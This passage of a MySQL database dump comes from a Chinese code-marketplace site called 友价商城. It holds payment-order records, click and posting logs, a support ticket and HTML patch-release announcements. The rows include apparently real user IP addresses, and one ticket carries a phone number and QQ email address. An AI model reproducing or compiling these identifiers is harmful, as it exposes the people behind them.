(376, '1553776772', '1553776772237905', 237, '2019-03-28 20:39:32', '110.52.7.120', 101, '等待买家付款', '', '微信支付', 0, '149121862220190328203932', NULL, NULL, 1),
(377, '1556098191', '15560981911570712', 15, '2019-04-24 17:29:51', '223.157.128.194', 100, 'wait', '', 'wx-H5', 0, NULL, NULL, NULL, 1),
(378, '1556098211pay15', '1556098211|15', 15, '2019-04-24 17:30:11', '223.157.128.194', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(379, '1556098245', '155609824584661285', 846, '2019-04-24 17:30:45', '1.193.200.246', 2626, 'wait', '', 'wx-h5', 0, NULL, NULL, '159xcf', 26),
(380, '1556098257pay846', '1556098257|846', 846, '2019-04-24 17:30:57', '1.193.200.246', 101, '等待买家付款', '', '', 0, NULL, NULL, NULL, 1),
(381, '1556098664', '155609866415317', 15, '2019-04-24 17:37:44', '223.157.128.194', 100, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(382, '1556160650', '1556160650|847', 847, '2019-04-25 10:50:50', '183.205.179.2', 3030, '等待买家付款', '', '', 0, NULL, NULL, '161xcf', 30),
(383, '1557733235', '1557733235954760', 954, '2019-05-13 15:42:29', '222.186.150.111', 1, 'suc', 'TRADE_SUCCESS', 'codepay', 1, NULL, NULL, NULL, NULL),
(384, '1557733634', '20190513154714815598|955', 955, '2019-05-13 15:47:14', '42.236.177.24', 555.5, 'wait', '', 'codepay', 0, NULL, NULL, '175', NULL),
(385, '1557733645', '20190513154725899045|955', 955, '2019-05-13 15:47:25', '42.236.177.24', 555.5, 'wait', '', 'codepay', 0, NULL, NULL, '175', NULL),
(386, '1558972482', '15589724821527921', 15, '2019-05-27 23:54:42', '223.157.119.254', 100, 'wait', '', 'wx-H5', 0, NULL, NULL, NULL, 1),
(387, '1559723885pay960', '1559723885|960', 960, '2019-06-05 16:38:05', '113.65.214.4', 50.5, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.5),
(388, '1559808172', '1559808172|961', 961, '2019-06-06 16:02:52', '111.226.203.167', 2626, '等待买家付款', '', '微信支付', 0, '149121862220190606160255', NULL, '177xcf', 26),
(389, '1560477019', '1560477019|964', 964, '2019-06-14 09:50:19', '118.249.120.92', 5050, '等待买家付款', '', '', 0, NULL, NULL, '180xcf', 50),
(390, '1560741331', '1560741331968377', 968, '2019-06-17 11:15:31', '42.236.179.84', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220190617111531', NULL, NULL, 0.01),
(391, '1560741338', '1560741338968501', 968, '2019-06-17 11:15:38', '42.236.179.84', 1.01, '等待买家付款', '', '微信支付', 0, '149121862220190617111538', NULL, NULL, 0.01),
(392, '1560741340pay968', '1560741340|968', 968, '2019-06-17 11:15:40', '42.236.179.84', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(393, '1560741353', '1560741353968586', 968, '2019-06-17 11:15:53', '42.236.179.84', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(394, '1561104651pay974', '1561104651|974', 974, '2019-06-21 16:10:51', '119.130.215.237', 1.01, '等待买家付款', '', '', 0, NULL, NULL, NULL, 0.01),
(395, '1561104656', '1561104656974299', 974, '2019-06-21 16:10:56', '119.130.215.237', 1, 'wait', '', 'otherpay', 0, NULL, NULL, NULL, NULL),
(396, '1561104668', '1561104668974535', 974, '2019-06-21 16:11:29', '49.234.36.214', 0.1, 'suc', 'TRADE_SUCCESS', 'otherpay', 1, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_djl`
--

CREATE TABLE IF NOT EXISTS `yjcode_djl` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  `admin` char(4) DEFAULT NULL,
  `bhid` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=35535 ;

--
-- 转存表中的数据 `yjcode_djl`
--

INSERT INTO `yjcode_djl` (`id`, `userid`, `sj`, `uip`, `admin`, `bhid`) VALUES
(35532, 142, '2019-10-25 11:30:47', '::1', 'c3', '204'),
(35533, 142, '2019-10-25 11:31:37', '::1', 'c1', '15'),
(35534, 142, '2019-10-25 11:32:42', '::1', 'c3', '203');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_domain`
--

CREATE TABLE IF NOT EXISTS `yjcode_domain` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `ubh` char(50) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `typesxid` varchar(250) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `lastgx` datetime DEFAULT NULL,
  `djl` int(11) DEFAULT '1',
  `zt` int(1) DEFAULT '1',
  `pwd` char(50) DEFAULT NULL,
  `txt` mediumtext,
  `hfl` int(11) DEFAULT '0',
  `name` varchar(250) DEFAULT NULL,
  `type` int(11) DEFAULT '1',
  `money` float DEFAULT '0',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `yjcode_domain`
--

INSERT INTO `yjcode_domain` (`id`, `bh`, `ubh`, `tit`, `typesxid`, `sj`, `lastgx`, `djl`, `zt`, `pwd`, `txt`, `hfl`, `name`, `type`, `money`) VALUES
(1, '1504343147', 'u1504319830', '备案域名低价出售', ',3,15,23,37,', '2017-09-02 17:07:33', '2017-09-02 17:07:33', 77, 1, '', '', 0, '928vip.cn', 0, 1000);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_fbhis`
--

CREATE TABLE IF NOT EXISTS `yjcode_fbhis` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(10) DEFAULT NULL,
  `ty1id` int(10) DEFAULT NULL,
  `ty2id` int(10) DEFAULT NULL,
  `ty3id` int(10) DEFAULT NULL,
  `ty4id` int(10) DEFAULT NULL,
  `ty5id` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=123 ;

--
-- 转存表中的数据 `yjcode_fbhis`
--

INSERT INTO `yjcode_fbhis` (`id`, `userid`, `ty1id`, `ty2id`, `ty3id`, `ty4id`, `ty5id`, `sj`, `uip`) VALUES
(37, 230, 37, 40, 46, 0, 0, '2019-02-24 21:13:08', '121.35.0.170'),
(2, 188, 37, 40, 46, 0, 0, '2018-07-31 16:21:15', '113.57.246.85'),
(3, 188, 39, 41, 0, 0, 0, '2018-07-31 16:34:28', '113.57.246.85'),
(4, 188, 39, 0, 0, 0, 0, '2018-07-31 16:46:44', '113.57.183.155'),
(5, 45, 61, 85, 0, 0, 0, '2018-08-02 23:36:10', '113.57.245.3'),
(6, 200, 37, 0, 0, 0, 0, '2018-09-23 21:27:25', '106.12.19.7'),
(8, 159, 37, 0, 0, 0, 0, '2018-09-24 11:14:04', '123.130.11.124'),
(122, 15, 37, 0, 0, 0, 0, '2019-06-22 14:33:52', '127.0.0.1'),
(10, 208, 37, 40, 46, 0, 0, '2018-10-12 11:07:14', '36.157.182.11'),
(11, 214, 37, 40, 47, 0, 0, '2018-10-25 10:38:17', '125.120.14.210'),
(13, 169, 37, 43, 0, 0, 0, '2018-10-27 18:45:44', '183.14.133.214'),
(14, 169, 61, 84, 0, 0, 0, '2018-10-27 18:52:58', '183.14.133.214'),
(94, 15, 37, 40, 0, 0, 0, '2019-05-27 23:41:54', '223.157.119.254'),
(19, 215, 37, 0, 0, 0, 0, '2018-11-01 14:43:21', '1.194.68.36'),
(32, 218, 37, 98, 0, 0, 0, '2018-12-27 17:30:34', '115.59.159.101'),
(89, 952, 37, 42, 0, 0, 0, '2019-05-18 13:54:49', '125.127.38.54'),
(65, 15, 37, 98, 0, 0, 0, '2019-04-08 00:06:03', '111.112.173.17'),
(30, 14, 37, 40, 0, 0, 0, '2018-12-23 20:49:00', '223.157.173.113'),
(112, 14, 38, 69, 0, 0, 0, '2019-06-09 23:32:03', '223.159.252.9'),
(40, 236, 38, 72, 0, 0, 0, '2019-03-22 13:36:22', '113.246.175.77'),
(39, 236, 39, 75, 0, 0, 0, '2019-03-22 12:19:27', '113.246.175.77'),
(66, 14, 37, 0, 0, 0, 0, '2019-04-08 13:15:04', '223.157.129.49'),
(72, 241, 63, 91, 0, 0, 0, '2019-04-11 18:13:16', '219.134.217.48'),
(73, 244, 37, 98, 0, 0, 0, '2019-04-13 14:54:51', '36.37.140.92'),
(76, 849, 38, 72, 0, 0, 0, '2019-04-29 00:41:10', '112.224.33.133'),
(77, 849, 37, 41, 50, 0, 0, '2019-04-29 01:01:47', '112.224.33.133'),
(79, 15, 37, 40, 47, 0, 0, '2019-05-07 17:39:58', '58.20.184.66'),
(96, 960, 37, 40, 47, 0, 0, '2019-06-05 16:10:13', '113.65.214.4'),
(97, 960, 38, 69, 70, 0, 0, '2019-06-05 16:10:33', '113.65.214.4'),
(98, 960, 39, 76, 0, 0, 0, '2019-06-05 21:35:04', '113.65.214.4'),
(100, 15, 38, 69, 0, 0, 0, '2019-06-09 23:06:56', '223.159.252.9'),
(113, 14, 38, 72, 0, 0, 0, '2019-06-09 23:32:32', '223.159.252.9'),
(117, 965, 37, 42, 0, 0, 0, '2019-06-19 15:28:18', '1.194.70.62'),
(121, 952, 37, 150, 0, 0, 0, '2019-06-19 16:35:57', '125.127.39.47');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_gd`
--

CREATE TABLE IF NOT EXISTS `yjcode_gd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `mot` char(50) DEFAULT NULL,
  `mail` char(50) DEFAULT NULL,
  `txt` text,
  `gdzt` int(10) DEFAULT NULL,
  `orderbh` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `yjcode_gd`
--

INSERT INTO `yjcode_gd` (`id`, `bh`, `userid`, `sj`, `uip`, `zt`, `mot`, `mail`, `txt`, `gdzt`, `orderbh`) VALUES
(4, '1493913869-45', 45, '2017-05-05 00:05:08', '113.80.11.191', 1, '15325096317', '744691045@qq.com', '444444444444444444<br />\r\n', 1, '4444444');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_gdhf`
--

CREATE TABLE IF NOT EXISTS `yjcode_gdhf` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(10) DEFAULT NULL,
  `gdbh` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_gg`
--

CREATE TABLE IF NOT EXISTS `yjcode_gg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `djl` int(10) DEFAULT NULL,
  `uip` char(30) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `txt` text,
  `zt` int(10) DEFAULT NULL,
  `wkey` varchar(250) DEFAULT NULL,
  `wdes` varchar(250) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `yjcode_gg`
--

INSERT INTO `yjcode_gg` (`id`, `bh`, `sj`, `djl`, `uip`, `tit`, `txt`, `zt`, `wkey`, `wdes`) VALUES
(2, '1488541104g74', '2017-03-03 19:38:24', 171, '223.157.131.226', '友价商城20170208补丁（主要优化任务大厅功能）', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">该补丁仅适用于友价商城T5源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">1、优化任务大厅功能(可接手并担保交易)</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">2、优化手机版首页界面</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">3、广告图片保存目录更名为gg（否则一些浏览器会过滤掉不显示）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">4、更多细节优化完善</p>', 0, '友价商城20170208补丁（主要优化任务大厅功能）', '友价商城20170208补丁（主要优化任务大厅功能）'),
(3, '1488541238g26', '2017-03-03 19:40:38', 229, '223.157.131.226', '友价T5商城20170117补丁（主要拓展实物交易功能内核）', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">该补丁仅适用于友价商城T5源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">1、短信新增应用模式（可适应阿里大鱼等更多短信商）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">2、修复后台快递信息修改的BUG</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">3、开通会员等级，进行折扣计算</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">4、会员等级月费自助续费功能</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">5、商品列表页新增会员折扣商品搜索</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">6、修复云支付接口</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">7、短信发送数量减扣修复</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">8、新增收货地址功能（因全国数据较大，请手动下载数据库导入</strong><strong style="margin: 0px auto; padding: 0px;">，如有疑问请联系专属客服。</strong></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">9、新增运费模板（可自定义）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">10、更多细节优化完善</p><p><br/></p>', 0, '友价t5商城20170117补丁（主要拓展实物交易功能内核）', '友价T5商城20170117补丁（主要拓展实物交易功能内核）'),
(4, '1488541265g82', '2017-03-03 19:41:05', 368, '223.157.131.226', '友价商城20170108补丁', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">该补丁仅适用于友价商城T5源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">1、手机版微信支付变更为标准付款模式（非扫描）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">2、QQ登录注册的账户没有推广关系</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">3、鼠标放到商品上，有详情介绍和演示的入口<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">4、附加属性支持自定义输入内容以及是否焦点显示</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">5、商品详情页输入数量，价格不会自动变化</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">6、修复解决https证书无法访问的问题</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">7、修复手机版提现银行设置无效的BUG</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">8、取消云支付接口</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">9、新增个人二维码直接扫码支付（人工入账的方式）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">10、更多细节优化完善</p><p><br/></p>', 0, '友价商城20170108补丁', '友价商城20170108补丁'),
(7, '1493649857g97', '2017-05-01 22:44:17', 482, '124.231.162.4', '友价商城源码20170430升级补丁', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">该补丁仅适用于友价商城源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">1、改进会员等级升级费用计算误差问题，改进等级费用</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">2、深化改进任务大厅</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">3、修复广告上传PNG格式图片显示错误的BUG</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">4、优化后台广告发布流程，发布完后，可以直接继续发布</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">5、增加任务大厅和手机版的后台开关</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">6、优化商品购买详情页面</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">7、修复会员等级购买商品价格计算的BUG（之前是无法读取会员自定义的折扣）<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">8、美化会员中心版面</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">9、评价机制新增好评、中评、差评的选项</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">10、商品详情页，商家信息框里显示保证金</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">11、网站后台增加管理员登录日志</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">12、新增积分银行</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">13、加上充值卡充值功能</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">14、更多细节优化完善</p><p><br/></p>', 0, '友价商城源码20170430升级补丁', '友价商城源码20170430升级补丁'),
